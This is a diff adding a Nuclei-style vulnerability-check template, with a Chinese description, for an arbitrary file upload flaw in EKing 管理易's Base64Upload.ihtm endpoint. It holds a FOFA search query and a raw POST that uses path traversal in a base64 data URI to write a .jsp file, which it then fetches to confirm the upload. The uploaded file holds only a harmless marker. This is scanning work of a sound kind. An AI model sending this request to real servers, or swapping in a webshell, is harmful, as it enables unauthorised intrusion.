@@ -1,0 +1,37 @@
+id: eking-guanliyi-base64upload_ihtm-file-upload
+
+info:
+  name: EKing 管理易 Base64Upload.ihtm 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: app="EKing-管理易"
+    EKing 管理易 Base64Upload.ihtm 接口存在任意文件上传漏洞，攻击者可通过base64_str参数上传恶意文件，可能导致服务器被入侵、Webshell植入等安全风险。
+  reference:
+    - 
+  tags: file-upload, eking, guanliyi
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |-
+        POST /Base64Upload.ihtm HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 88
+
+        base64_str=data:image//../../../{{username}}.jsp.;base64,cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ==
+
+      - |-
+        GET /{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code == 200 && contains_all(body, 'pboyjnnrfipmplsukdeczudsefxmywe')"
